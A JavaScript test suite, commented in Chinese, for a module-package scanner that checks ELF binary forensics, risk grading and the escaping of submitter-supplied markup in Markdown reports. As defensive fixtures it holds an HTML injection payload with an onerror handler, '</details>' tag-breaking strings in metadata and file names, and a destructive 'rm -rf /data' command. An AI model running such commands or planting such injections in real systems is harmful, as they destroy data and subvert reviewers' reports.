  assert.equal(so.parseError, undefined, `真字节必须真读出来，不许每条都 parseError：${JSON.stringify(so)}`);
  assert.deepEqual(so.families, ['EXEC', 'FILEWRITE', 'NET', 'NS']);
  assert.deepEqual(cli.families, ['EXEC', 'FILEWRITE', 'NS', 'PROP']);
  assert.equal(so.entryBytes, 983624);
  assert.equal(cli.entryBytes, 485944);
  assert.deepEqual(r.counts, { high: 2, medium: 1, low: 0, info: 0 });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
  // 字节面没进产物（§5.3 的第一格）
  assert.equal(JSON.stringify(r).includes('not a raw byte Buffer'), false);
});

test('T57-11 HMA 那枚小 ELF（24 导入、0 族）⇒ medium，message 说得出「读到 24 个导入」', async () => {
  const r = await t57Run('hmaSmall');
  assert.deepEqual(t57Spots(r), ['zygisk/arm64-v8a.so:0/medium']);
  assert.match(r.findings.find((f) => f.ruleId === 'STRUCT_BINARY').message, /读到 24 个导入/);
  assert.deepEqual(t57Row(r, 'zygisk/arm64-v8a.so').families, []);
  assert.equal(t57Row(r, 'zygisk/arm64-v8a.so').importCount, 24);
  assert.deepEqual(r.counts, { high: 0, medium: 1, low: 0, info: 0 });
  assert.equal(r.decision.action, 'block');
});

test('T57-12 非 ELF 两形（真 PNG / PNG 头 + ELF 体）⇒ medium，口径里不许出现「读不了」「无法解析」', async () => {
  const png = await t57Run('pngOnly');
  const pRow = t57Struct(png)[0];
  assert.equal(pRow.severity, 'medium');
  assert.match(pRow.message, /不是 ELF/);
  assert.doesNotMatch(pRow.message, /读不了|无法解析|无法审查/);
  assert.equal(t57Row(png, 'icons/1x1.png').outcome, 'NOT_ELF');
  assert.deepEqual(png.counts, { high: 0, medium: 1, low: 0, info: 0 });

  const pe = await t57Run('pngElf');
  const peRow = t57Struct(pe).find((f) => f.file === 'assets/mix.png');
  assert.equal(peRow.severity, 'medium');
  assert.doesNotMatch(peRow.message, /读不了|无法解析/);
  assert.equal(t57Row(pe, 'assets/mix.png').outcome, 'NOT_ELF', 'PNG 头包住 ELF 体也不许冒充读到了 ELF');
});

test('T57-13 真 ELF + T4 polyglot 同包：polyglot 的账照旧落在 feed，本轮不许挪到取证上', async () => {
  const r = await t57Run('polyglotReal');
  assert.deepEqual((r.polyglotFed || []).map((x) => x.name), ['assets/payload.bin'],
    'feed 那本账一字不动（T4 的证人），取证是另一本账');
  assert.deepEqual(t57Spots(r), ['assets/payload.bin:0/medium', 'zygisk/arm64-v8a.so:0/medium']);
  assert.equal(t57Row(r, 'assets/payload.bin').outcome, 'PARSE_ERROR', 'ELF 魔数 + 五行明文不是能解析的 ELF');
  assert.deepEqual(r.counts, { high: 3, medium: 3, low: 1, info: 0 },
    '改前实测就是这一组数：内容那五条 + 两条 STRUCT_BINARY，一条不多一条不少');
});

test('T57-14 超过取证字节上限的真 ELF：raw 正好截在上限，且登记成 INPUT_CAPPED +「输入不完整」', async () => {
  const cap = T57_SCAN.MAX_FORENSICS_BYTES;
  assert.equal(cap, T57_ELF.STRING_SCAN_LIMIT, '上限只许有一份，且必须说得出依据');
  const r = await t57Run('overCap');
  const row = t57Row(r, 'assets/big.elf');
  assert.equal(row.outcome, 'INPUT_CAPPED');
  assert.equal(row.rawBytes, cap, '留下的字节必须正好等于上限，不多留一个字节');
  assert.equal(row.entryBytes, cap + 1);
  assert.match(t57Struct(r)[0].message, /输入不完整/);
  assert.equal(t57Struct(r)[0].severity, 'medium');
  // 两个数各说各的话：条目多大 == 条目自己（cap+1），喂进去多少 == cap。
  // 取错来源的那一版会写成「条目 8388608 B 超过上限，只喂进 8388608 B」——自相矛盾的句子（本轮实测过）。
  const capMsg = t57Struct(r)[0].message;
  assert.ok(capMsg.includes(String(cap + 1)) && capMsg.includes(String(cap)),
    `条目大小与实喂大小都要出现且不相等：${capMsg}`);
  assert.notEqual(row.entryBytes, row.rawBytes, '登记里这两个数也必须不是同一个来源');
});

test('T57-15 产物里不许有 raw，也不许有 NUL（§5.3 那一格，撑着一段历史事故）', async () => {
  for (const id of ['df2', 'detach32', 'overCap']) {
    const r = await t57Run(id);
    const json = JSON.stringify(r);
    const rj = renderJSON(r);
    const md = renderMarkdown(r);
    assert.equal(/"raw"\s*:/.test(json), false, `${id}：报告里不许出现 raw 字段`);
    assert.equal(json.includes('\u0000'), false, `${id}：JSON.stringify(report) 里不许有 NUL`);
    assert.equal(rj.includes('\u0000'), false, `${id}：renderJSON 里不许有 NUL`);
    assert.equal(md.includes('\u0000'), false, `${id}：renderMarkdown 里不许有 NUL`);
    // 尺寸上界：这一格是「raw 或其 utf8 糊化结果没漏进产物」的硬证据。
    // df2 的原始字节 1.47 MB、overCap 单条就 8 MiB，报告只能有 KB 量级。
    assert.ok(json.length < 200_000, `${id}：报告 JSON ${json.length} B，二进制字节面漏进产物了`);
    assert.ok(md.length < 200_000, `${id}：Markdown ${md.length} B`);
  }
});

test('T57-16 raw 只在 detectBinary 命中处保留：文本条目 raw===null，二进制条目是 Buffer 且有上限闸（§5.1/§5.2）', () => {
  const cap = T57_SCAN.MAX_FORENSICS_BYTES;
  assert.ok(Number.isInteger(cap) && cap > 0, `MAX_FORENSICS_BYTES 必须是正整数具名常量：${JSON.stringify(cap)}`);
  const byName = Object.fromEntries(readZip(t57Zip('df2')).files.map((f) => [f.name, f]));
  assert.equal(byName['module.prop'].raw, null, '文本条目不许留 Buffer（§5.1：那会把文本条目的内存翻倍）');
  assert.equal(byName['service.sh'].raw, null);
  assert.equal(typeof byName['module.prop'].content, 'string', 'content 仍是 utf8 串，本轮不许换形状');
  assert.ok(Buffer.isBuffer(byName['zygisk/arm64-v8a.so'].raw), '二进制条目必须留住原始字节，否则整套新分支静默失效');
  assert.equal(byName['zygisk/arm64-v8a.so'].raw.length, 983624);
  assert.equal(byName['zygisk/arm64-v8a.so'].rawCapped, false);
  const big = Object.fromEntries(readZip(t57Zip('overCap')).files.map((f) => [f.name, f]));
  assert.equal(big['assets/big.elf'].raw.length, cap, '超限那条只许留到上限');
  assert.equal(big['assets/big.elf'].rawCapped, true, '超限那一格要产生看得见的记录，不许静默变成「读不出」');
  // §5.2 的**真实目的**是管住「留住的字节数」，不只是「解析多少」。
  // `Buffer.prototype.subarray` 返回的是**视图**（与父 ArrayBuffer 共享存储），
  // 所以 `raw.length === cap` 完全可能仍然钉着一整块 64 MiB —— 上限就成了装饰。
  // 实测一枚 40 MiB 缓冲取 8 MiB 视图：`view.buffer.byteLength` 仍是 40 MiB。
  assert.equal(big['assets/big.elf'].raw.buffer.byteLength, cap,
    `超限那条必须把前缀**拷出来**：视图会把整块父缓冲钉住，`
    + `实得 raw=${big['assets/big.elf'].raw.length} 而底层 buffer=${big['assets/big.elf'].raw.buffer.byteLength}`);
});

// ---------------------------------------------------------------------------
// 三条不变量（工单 §3：本轮真正的价值在这里，不在逐条断言）
// 批次 = 六个常驻夹具包（含 PNG、polyglot、超限那三格别的形状）
// ---------------------------------------------------------------------------

const T57_BATCH = Object.keys(T57_PKGS);
const t57BatchCount = (r) => t57Struct(r).filter((f) => f.severity === 'high').length;

test('INV-A 接线是活的：自动那一份 vs 手动不传 map 的那一份，差集只可能是 medium→high，条数绝不变', async () => {
  let wiredHigh = 0;
  let manualHigh = 0;
  for (const id of T57_BATCH) {
    const r = await t57Run(id);
    const wired = t57Struct(r);
    const manual = checkBinaries(t57Bins(r)).slice().sort((a, b) => (a.file < b.file ? -1 : a.file > b.file ? 1 : 0));
    assert.equal(manual.length, r.binaries.length, `${id}：不传 map 也要一物一条`);
    assert.equal(wired.length, manual.length, `${id}：接线前后的条数必须一字不变`);
    let high = 0;
    for (let i = 0; i < wired.length; i++) {
      assert.equal(wired[i].file, manual[i].file, `${id}：按条目名逐条对账`);
      assert.equal(wired[i].ruleId, 'STRUCT_BINARY');
      assert.equal(wired[i].line, manual[i].line, `${id}：line 口径不许动`);
      assert.equal(wired[i].snippet, manual[i].snippet, `${id}：snippet 不许放取证摘要（§2），档位之外一律照旧`);
      const from = manual[i].severity;
      const to = wired[i].severity;
      const up = SEVERITY_ORDER[to] - SEVERITY_ORDER[from];
      assert.ok(up >= 0, `${id}/${wired[i].file}：档位只增不减，实测 ${from}→${to}`);
      if (up !== 0) {
        assert.equal(from, 'medium', `${id}/${wired[i].file}：差集只能从 medium 出发`);
        assert.equal(to, 'high', `${id}/${wired[i].file}：差集只能落在 high`);
      }
      if (to === 'high') high++;
      if (from === 'high') manualHigh++;
    }
    assert.equal(high, T57_PKGS[id].high, `${id}：接线后该升几档是量过的（名字口径或字节口径漂了都会红在这一格）`);
    wiredHigh += high;
  }
  assert.equal(manualHigh, 0, '不传 map 的那一份永远只有 medium（向后兼容的另一面）');
  assert.equal(wiredHigh, 3, '全批实测 3 条 high：df2 两枚真 ELF + detach-arm32 一枚');
});

test('INV-B 永不开自动放行：每个 binaries 条目恰好一条参与定级的 STRUCT_BINARY，档位 ∈ {medium, high}', async () => {
  for (const id of T57_BATCH) {
    const r = await t57Run(id);
    assert.notEqual(r.decision.action, 'auto-approve', `${id}：含二进制的包永远不许落到自动通道`);
    const sb = t57Struct(r);
    assert.deepEqual(r.binaries.map((b) => b.name).slice().sort(), sb.map((f) => f.file),
      `${id}：按条目名逐条对账，不是数总数`);
    for (const f of sb) {
      assert.ok(countsTowardRisk(f), `${id}/${f.file}：这条必须参与定级（写成 info 就是开了自动放行的口子）`);
      assert.ok(f.severity === 'medium' || f.severity === 'high',
        `${id}/${f.file}：档位只能是 medium 或 high，实测 ${f.severity}`);
    }
    assert.ok(r.counts.medium + r.counts.high >= r.binaries.length, `${id}：条数下限`);
  }
});

test('INV-C 档位只增不减：同批包 counts.medium + counts.high 在改动前后相等，high 只许变大', async () => {
  let beforeTotal = 0;
  let afterTotal = 0;
  let beforeHigh = 0;
  let afterHigh = 0;
  for (const id of T57_BATCH) {
    const r = await t57Run(id);
    // 「改动前」用常驻代码自己算出来：把这一批 STRUCT_BINARY 换成不传 map 的那一份再定级。
    const before = scoreRisk([...r.findings.filter((f) => f.ruleId !== 'STRUCT_BINARY'), ...checkBinaries(t57Bins(r))]);
    assert.equal(before.counts.medium + before.counts.high, r.counts.medium + r.counts.high,
      `${id}：参与定级的条数守恒（改前 ${JSON.stringify(before.counts)} / 改后 ${JSON.stringify(r.counts)}）`);
    assert.equal(before.counts.low, r.counts.low, `${id}：low 也不许多出来`);
    assert.equal(before.counts.info, r.counts.info, `${id}：info 多出来 == 有一条被降级了`);
    assert.ok(r.counts.high >= before.counts.high, `${id}：high 只许变大`);
    assert.ok(r.riskLevel === before.level || r.riskLevel === 'high', `${id}：整包等级只许更严`);
    beforeTotal += before.counts.medium + before.counts.high;
    afterTotal += r.counts.medium + r.counts.high;
    beforeHigh += before.counts.high;
    afterHigh += r.counts.high;
  }
  assert.equal(afterTotal, beforeTotal, '全批守恒');
  // 这两个数是本轮实测的**整包** counts（含别的规则自带的 high），不是 STRUCT_BINARY 单独数：
  // polyglotReal 那一只包本来就带 3 条 high，所以基线不是 0。
  // STRUCT_BINARY 自己的那一本账在 INV-A：手动那一份 0 条 high，接线那一份 3 条。
  assert.equal(beforeHigh, 3, '改前全批 3 条 high（本轮实测）');
  assert.equal(afterHigh, 6, '改后全批 6 条 high（本轮实测）');
  assert.equal(afterHigh - beforeHigh, 3, '净增的 3 条就是被取证升档的那三条 STRUCT_BINARY，一条不许更多');
  assert.equal(t57BatchCount(await t57Run('df2')), 2, 'df2 两枚真 ELF 必须都升 high');
});

// ---------------------------------------------------------------------------
// T6.3（工单 2026-10-16）：报告正文里**投稿者来源**的字符串，落进 markdown 之前先中和 markup
//
// 实测的洞（工单 §0）：author 写一句 `</details>` 就能提前关掉别人的折叠块、在报告正文里
// 造一个看起来像「审核结论」的块。GitHub 的 sanitizer 会剥掉 onerror，所以拿到的不是 XSS，
// 是「这条评论的结构由投稿者控制」——危害说准，别夸大。
//
// 三条边界，都在下面的断言里，不在注释里：
//   1) 只作用于给人看的那一面：renderJSON 的字节一个都不许变（AI 那一层吃 JSON + readZip 原文）。
//   2) 只中和不删字（& 先转避免二次转义；< > 反引号转实体；控制序列换空格）。
//   3) 判据只许有一份：这把中和是 scan.mjs 里的具名函数；6.2 给评论 intro 用的 inert()
//      在 workflow 里，两层各管各的面，本单不许把它们合成一层（合成后 6.2 那条必须红）。
// ---------------------------------------------------------------------------

// 干净包实测：renderMarkdown 自己的结构不产生任何 <details>/</details>（全文那一节是围栏，不是标签）。
// 钉成常量，不许写 <=：多出来的每一个闭合标签都是投稿者写的。
const T63_STRUCT_CLOSE = 0;

/**
 * 「围栏外的那一份 markdown」——投稿者字节仍然原样留在我们自己的 code fence 里，
 * 那是给人复核原文用的，而且 GitHub 在围栏内不解释 HTML，围栏长度由 fenceFor 保证关不掉。
 * 所以「markup 漏进正文」的判据只看围栏之外：这个视图把成对的合法围栏连同其内容一起剔掉。
 */
function t63OutsideFences(md) {
  const keep = [];
  let fence = null;
  for (const line of String(md).split('\n')) {
    const m = line.match(/^\s*(`{3,})/);
    if (m) {
      if (fence === null) { fence = m[1].length; continue; }
      if (m[1].length >= fence) { fence = null; continue; }
      if (fence === null) keep.push(line);
      continue;
    }
    if (fence === null) keep.push(line);
  }
  return keep.join('\n');
}

const t63Count = (s, re) => (String(s).match(re) || []).length;

test('T6.3·渲染的折叠边界：module.prop 的 author/description 里的 markup 不许拆掉报告结构', async () => {
  // 真管线：makeModuleZip -> scanZip -> renderMarkdown（不手写报告形状）。
  const zip = makeModuleZip({
    id: 't63fold',
    files: [
      ['module.prop', 'id=t63fold\nname=t63fold\n'
        + 'description=x <img src=q onerror=alert(1)> y ``` z\n'
        + 'version=v1.0\u0001\nversionCode=1\n'
        + 'author=a</details>b<details><summary>伪造</summary>\n'],
      ['service.sh', '#!/system/bin/sh\necho ok\n'],
    ],
  });
  const md = renderMarkdown(await scanToReport(zip, { changeType: 'first' }));
  const body = t63OutsideFences(md);
  assert.equal(t63Count(body, /<\/details>/g), T63_STRUCT_CLOSE,
    `闭合标签必须恰好等于我们自己结构产生的数量（${T63_STRUCT_CLOSE}），多出来的都是投稿者写的：\n${body}`);
  assert.equal(t63Count(body, /<details>/g), T63_STRUCT_CLOSE, '开标签同样只许来自我们自己');
  assert.equal(t63Count(body, /<summary>/g), 0, '<summary> 不许原样在场');
  assert.equal(t63Count(body, /```/g), 0, 'description 里的 ``` 不许在正文里造围栏（围栏只许是我们自己的）');
  assert.ok(!/<img\b/.test(body), '注入的 <img> 不许原样出现在正文');
  assert.ok(!body.includes('\u0001'), '控制序列不许原样进正文');
  // 只中和不删字：内容还得看得见，否则没人知道投稿者写过什么。
  assert.ok(body.includes('&lt;/details&gt;'), '闭合标签要变成实体形式，不许直接删掉');
  assert.ok(body.includes('&lt;summary&gt;'), '开标签同样只中和不删字');
  assert.ok(/&#96;/.test(body), '反引号要变成实体（与 6.2 的 inert 同形）');
  assert.ok(body.includes('伪造'), '中和之后「伪造」两个字还在（删字就是掩盖证据）');
  // 人还读得懂：我们自己的结构一个字都不许被这把中和波及。
  assert.ok(md.includes('\n## 结论\n'), '我们自己的标题不许被中和');
  assert.ok(md.includes('- 处置：**`'), '我们自己写的内联代码围栏必须还是真反引号');
  assert.ok(/```(sh|text)\n/.test(md), '全文那一节的围栏必须还是真反引号（人工复核要看原文）');
});

test('T6.3·条目名也走同一把中和：zip 里合法的 `</details>` 条目名不许拆结构', async () => {
  // 这一条不许省：第一发很容易只修 meta 就交差。条目名同样是投稿者起的。
  const evil = 'x</details>`y.sh';
  const zip = makeModuleZip({
    id: 't63entry',
    files: [[evil, '#!/system/bin/sh\necho hi\n']],
  });
  const md = renderMarkdown(await scanToReport(zip, { changeType: 'first' }));
  const body = t63OutsideFences(md);
  assert.equal(t63Count(body, /<\/details>/g), T63_STRUCT_CLOSE,
    `条目名里的 </details> 不许漏进正文（清单行与「### 条目名」标题都是落点）：\n${body}`);
  assert.equal(t63Count(body, /<details>/g), T63_STRUCT_CLOSE);
  assert.equal(t63Count(body, /```/g), 0, '条目名里的反引号不许造出正文围栏');
  assert.ok(body.includes('x&lt;/details&gt;&#96;y.sh'), '条目名中和后仍要逐字看得见');
});

test('T6.3·片段与文件名走同一把中和：finding 的 file 与 snippet 落进 markdown 后不产生新标签', async () => {
  // snippet 就是脚本原文/属性原文的匹配片段（trimSnippet 实测只压空白、不转义 `<`）。
  const zip = makeModuleZip({
    id: 't63frag',
    files: [
      ['module.prop', 'id=a<img src=q onerror=alert(1)>`b\nname=t63frag\ndescription=ok\n'
        + 'version=v1.0\nversionCode=1\nauthor=fixture\n'],
      ['rm</details>.sh', '#!/system/bin/sh\nrm -rf /data\n'],
    ],
  });
  const r = await scanToReport(zip, { changeType: 'first' });
  const md = renderMarkdown(r);
  const body = t63OutsideFences(md);
  assert.ok(r.findings.some((f) => f.file === 'rm</details>.sh'), '前提：文件名那一列必须真的带着 markup');
  assert.ok(r.findings.some((f) => f.snippet.includes('<img')), '前提：片段那一列必须真的带着 markup');
  assert.equal(t63Count(body, /<\/details>/g), T63_STRUCT_CLOSE, `file 列不许造出闭合标签：\n${body}`);
  assert.ok(!/<img\b/.test(body), 'snippet 里的 <img> 不许原样进表格');
  assert.ok(!/<summary>/i.test(body), '片段里的标签不许变成真标签');
  assert.ok(body.includes('rm&lt;/details&gt;.sh'), '文件名中和后仍要逐字看得见');
  assert.ok(body.includes('&lt;img src=q onerror=alert(1)&gt;'), '片段中和后仍要逐字看得见（只中和不删字）');
});

test('T6.3·JSON 面一字不变：markdown 的中和绝不许顺着改到 renderJSON（AI 那一层吃的是 JSON）', async () => {
  const zip = makeModuleZip({
    id: 't63json',
    files: [
      ['module.prop', 'id=t63json\nname=t63json\n'
        + 'description=x <img src=q onerror=alert(1)> y ``` z\n'
        + 'version=v1.0\nversionCode=1\nauthor=a</details>b<details><summary>伪造</summary>\n'],
      ['service.sh', '#!/system/bin/sh\nrm -rf /data\n'],
    ],
  });
  const r = await scanToReport(zip, { changeType: 'first' });
  const before = JSON.stringify(r);
  const md = renderMarkdown(r);
  // 渲染不许顺手改报告对象（改了就是拿 markdown 的口径去动 AI 的进料）。
  assert.equal(JSON.stringify(r), before, 'renderMarkdown 必须不改 report 一个字节');
  const json = renderJSON(r);
  assert.equal(renderJSON(r), json, 'renderJSON 幂等：两次产出逐字节相同');
  // 同一份报告：markdown 那面是中和过的，JSON 那面必须还是原文。
  assert.ok(md.includes('&lt;/details&gt;'), 'markdown 面：已中和');
  assert.ok(json.includes('a</details>b<details><summary>伪造</summary>'), 'JSON 面：author 仍是原文');
  assert.ok(json.includes('<img src=q onerror=alert(1)>'), 'JSON 面：description 仍是原文');
  assert.ok(json.includes('rm -rf /data'), 'JSON 面：脚本原文仍是原文');
  assert.equal(t63Count(json, /&lt;|&gt;|&#96;/g), 0, '实体形式一个都不许出现在 JSON 产物里');
});

// 工单 §5 的自问自答：「将来有人在 renderMarkdown 里新加一段投稿者来源的输出却忘了走这把中和，
// 今天有哪一条用例会红？」—— 逐字段的四条答不了这个问题（新字段没有对应的旧用例）。
// 所以这一条**不看字段，看记号**：把同一枚记号喂进真管线里能喂的每一个投稿者槽位，
// 再从 report 自己列出「带着记号的字符串叶子」清单（跨步骤前提必须自己是一条断言，
// 否则记号根本没进报告时这一格会假绿），然后要求这些原文一个都不许原样出现在围栏外。
// 于是新落点只要打印的是报告里**任何一处**投稿者字节，就红在这一格。
const T63_MARK = '</details><zz9>';

function t63Leaves(node, acc = []) {
  if (typeof node === 'string') { if (node.includes(T63_MARK)) acc.push(node); return acc; }
  if (node == null || typeof node !== 'object' || Buffer.isBuffer(node)) return acc;
  for (const v of Object.values(node)) t63Leaves(v, acc);
  return acc;
}

test('T6.3·新落点漏走中和也必须红：报告里带注入记号的原文，一个都不许原样出现在围栏外', async () => {
  const zip = makeModuleZip({
    id: 't63mark',
    files: [
      ['module.prop', `id=a${T63_MARK}b\nname=n${T63_MARK}\ndescription=d${T63_MARK}\n`
        + `version=v${T63_MARK}\nversionCode=1\nauthor=${T63_MARK}\n`],
      [`s${T63_MARK}.sh`, '#!/system/bin/sh\necho hi\n'],
    ],
  });
  const r = await scanToReport(zip, { changeType: 'first' });
  const leaves = t63Leaves(r);
  assert.ok(leaves.length >= 6, `前提：记号必须真的散在报告里（实测 ${leaves.length} 处字符串叶子），不然这一格是空闸`);
  assert.ok(new Set(leaves).size >= 5, `前提：至少要有 5 个不同字段带着它（实测 ${new Set(leaves).size}）`);
  const body = t63OutsideFences(renderMarkdown(r));
  assert.ok(!body.includes(T63_MARK),
    `凡是打印报告里投稿者字节的新落点，只要没过 inertMarkdown 就红在这里：\n${body}`);
  assert.equal(t63Count(body, /<\/details>/g), T63_STRUCT_CLOSE, '闭合标签的总数仍然只许来自我们自己的结构');
  // 反向闸：上面那条不许因为「什么都没打印」而假绿 —— 已中和的落点必须真的在场。
  assert.ok(body.includes('&lt;/details&gt;&lt;zz9&gt;'), '中和过的落点必须还在正文里看得见');
  assert.ok(renderJSON(r).includes(T63_MARK), 'JSON 面仍然必须是原文（这一格也不许把中和漏过去）');
});
